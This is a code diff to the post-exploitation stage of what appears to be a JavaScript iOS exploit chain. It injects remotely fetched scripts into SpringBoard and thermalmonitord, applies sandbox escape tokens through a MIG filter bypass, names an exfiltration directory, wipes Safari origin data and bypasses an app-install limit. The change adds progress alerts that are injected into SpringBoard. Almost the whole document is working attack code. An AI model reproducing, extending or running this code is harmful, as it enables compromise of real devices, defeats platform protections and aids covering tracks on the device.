@@ -8469,7 +8469,6 @@ const CHAIN_STATUS_OVERLAY_PATH = "/chain_status_overlay.js";
 const CHAIN_STATUS_OVERLAY_LABEL = "Chain Status Overlay";
 const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/brokenblade_chain_status.log";
 const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
-const ENABLE_SPRINGBOARD_AGENT = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK || ENABLE_CHAIN_STATUS_OVERLAY;
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
@@ -8742,8 +8741,8 @@ function injectLightweightSpringBoardPayload(existingTask, migFilterBypass, agen
 	}
 }
 
-function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid) {
-	LOG("[PE] Injecting " + CHAIN_STATUS_OVERLAY_LABEL + " into SpringBoard...");
+function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid, alertText=null, oneShot=false) {
+	LOG("[PE] Injecting " + CHAIN_STATUS_OVERLAY_LABEL + " into SpringBoard... oneShot=" + oneShot);
 	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code source: " + (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0 ? "prefetched (" + globalThis.__chain_status_overlay_code.length + " bytes)" : "fetchRemoteScript(" + CHAIN_STATUS_OVERLAY_PATH + ")"));
 	let code = (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0) ? globalThis.__chain_status_overlay_code : fetchRemoteScript(CHAIN_STATUS_OVERLAY_PATH);
 	if (!code) {
@@ -8752,7 +8751,9 @@ function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid) {
 	}
 	const prelude =
 		'globalThis.__bb_chain_status_path = ' + JSON.stringify(CHAIN_STATUS_LOG_PATH) + ';\n' +
-		'globalThis.__bb_chain_status_complete_marker = "[PE] start() completed successfully";\n';
+		'globalThis.__bb_chain_status_complete_marker = "[PE] start() completed successfully";\n' +
+		(alertText !== null ? 'globalThis.__bb_chain_progress_text = ' + JSON.stringify(String(alertText)) + ';\n' : '') +
+		(oneShot ? 'globalThis.__bb_chain_overlay_one_shot = true;\n' : '');
 	code = prelude + code;
 	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code loaded: " + code.length + " bytes");
 	try {
@@ -8765,6 +8766,16 @@ function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid) {
 		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " stack: " + (e.stack || "no stack"));
 		return false;
 	}
+}
+
+function postChainStatusAlert(existingTask, migFilterBypass, agentPid, text) {
+	if (!ENABLE_CHAIN_STATUS_OVERLAY) return false;
+	if (!existingTask) {
+		LOG("[PE] Chain status alert skipped, no SpringBoard task: " + text);
+		return false;
+	}
+	LOG("[PE] Chain status alert: " + text);
+	return injectChainStatusOverlay(existingTask, migFilterBypass, agentPid, text, true);
 }
 
 function injectThermalmonitordPayload(migFilterBypass, path, label) {
@@ -9741,6 +9752,9 @@ function start() { LOG("[+] PE start() called");
 		launchdTask.destroy();
 		return false;
 	}
+	let springBoardAgentLoader = null;
+	let springBoardAgentTask = null;
+	let agentPid = 0;
 	try {
 
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
@@ -9755,47 +9769,42 @@ function start() { LOG("[+] PE start() called");
 	LOG("[PE] Exfil dir: " + filzaDst);
 	LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
 
-	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
-	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
-		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
-	}
-
-	let agentPid = 0;
-	if (ENABLE_SPRINGBOARD_AGENT) {
-		let agentLoader = null;
+	let needsSpringBoardAgent = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK || ENABLE_CHAIN_STATUS_OVERLAY;
+	if (needsSpringBoardAgent) {
 		try {
 			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK + " overlay=" + ENABLE_CHAIN_STATUS_OVERLAY);
 			LOG("[PE] Creating agent loader for " + targetProcess);
-			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
+			springBoardAgentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
 			LOG("[PE] Agent loader created, calling inject()...");
-			let agentInjected = agentLoader.inject();
+			let agentInjected = springBoardAgentLoader.inject();
 			LOG("[PE] Agent loader inject result: " + agentInjected);
 			if (agentInjected) {
 				LOG("[+] Agent loader injected");
-				agentPid = agentLoader.task.pid();
+				springBoardAgentTask = springBoardAgentLoader.task;
+				agentPid = springBoardAgentTask.pid();
 				LOG("[PE] Agent loader pid=" + agentPid + "; applying sandbox tokens");
-				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
+				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(springBoardAgentTask);
 				LOG("[PE] Agent loader tokens applied; adjusting memory pressure");
 				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
+				postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS chain in progress");
 				if (ENABLE_CORUNA_TWEAKLOADER)
-					injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
+					injectCorunaTweakloader(springBoardAgentTask, migFilterBypass, agentPid);
 				else
 					LOG("[PE] Coruna tweakloader disabled");
 				let springboardTweakInjected = false;
-				if (ENABLE_SPRINGBOARD_JS_TWEAK)
-					springboardTweakInjected = injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
-				else
+				if (ENABLE_SPRINGBOARD_JS_TWEAK) {
+					postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS applying SpringBoard tweak");
+					springboardTweakInjected = injectLightweightSpringBoardPayload(springBoardAgentTask, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
+					postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, springboardTweakInjected ? "LS SpringBoard tweak applied" : "LS SpringBoard tweak failed");
+				} else {
 					LOG("[PE] SpringBoard JS tweak disabled");
+				}
 				if (springboardTweakInjected && !ENABLE_POWERCUFF_TWEAK && SBCUST_ONLY_SETTLE_DELAY_USEC > 0n) {
 					LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
 					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
 				}
-				// Inject the status overlay last. Its polling worker keeps a
-				// SpringBoard-side JS context alive, and running it before the
-				// other SpringBoard payloads can starve/reenter the same RemoteCall
-				// path used for the follow-up injection.
 				if (ENABLE_CHAIN_STATUS_OVERLAY)
-					injectChainStatusOverlay(agentLoader.task, migFilterBypass, agentPid);
+					LOG("[PE] Chain status alerts using one-shot milestones");
 				else
 					LOG("[PE] Chain status overlay disabled");
 
@@ -9805,25 +9814,27 @@ function start() { LOG("[+] PE start() called");
 		} catch (agentErr) {
 			LOG("[PE] Agent loader exception: " + String(agentErr));
 			LOG("[PE] Agent loader stack: " + (agentErr.stack || "no stack"));
-		} finally {
-			if (agentLoader) {
-				LOG("[PE] Destroying agent loader");
-				try {
-					agentLoader.destroy();
-					LOG("[PE] Agent loader destroyed");
-				} catch (destroyErr) {
-					LOG("[PE] Agent loader destroy exception: " + String(destroyErr));
-				}
-			}
 		}
 	} else {
 		LOG("[PE] SpringBoard agent loader skipped (no SpringBoard payload enabled)");
 	}
 
-		if (ENABLE_POWERCUFF_TWEAK)
+	postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS cleaning Safari data");
+	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
+	if (safariCleanOk)
+		postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS Safari data cleaned");
+	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
+		postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS restarting Safari");
+		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
+	}
+
+		if (ENABLE_POWERCUFF_TWEAK) {
+			postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS applying Powercuff");
 			injectThermalmonitordPayload(migFilterBypass, POWERCUFF_TWEAK_PATH, POWERCUFF_TWEAK_LABEL);
-		else
+			postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS Powercuff applied");
+		} else {
 			LOG("[PE] Powercuff tweak disabled");
+		}
 
 	runOptionalStage("Unrelated dumps master switch", ENABLE_UNRELATED_DUMPS, () => true);
 
@@ -9998,6 +10009,7 @@ function start() { LOG("[+] PE start() called");
 	// ========== 3-App Limit Bypass (APFS own + direct removexattr) ==========
 	LOG("[THREEAPP] ENABLE_THREEAPP = " + ENABLE_THREEAPP);
 	if (ENABLE_THREEAPP) {
+		postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS 3 app bypass running");
 		LOG("[THREEAPP] === APP LIMIT BYPASS ENTRY ===");
 		try {
 			const ALNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
@@ -10425,15 +10437,26 @@ function start() { LOG("[+] PE start() called");
 			LOG("[THREEAPP] ERROR: " + String(alErr));
 		}
 		LOG("[THREEAPP] === APP LIMIT BYPASS EXIT ===");
+		postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS 3 app bypass done");
 	} else {
 		LOG("[THREEAPP] 3-App Bypass disabled");
 	}
 
+	LOG("[PE] start() completed successfully");
+	postChainStatusAlert(springBoardAgentTask, migFilterBypass, agentPid, "LS chain complete");
 	} finally {
+		if (springBoardAgentLoader) {
+			LOG("[PE] Destroying agent loader");
+			try {
+				springBoardAgentLoader.destroy();
+				LOG("[PE] Agent loader destroyed");
+			} catch (destroyErr) {
+				LOG("[PE] Agent loader destroy exception: " + String(destroyErr));
+			}
+		}
 		LOG("[PE] Cleaning up launchdTask...");
 		launchdTask.destroy();
 	}
-	LOG("[PE] start() completed successfully");
 
 	return true;
 }
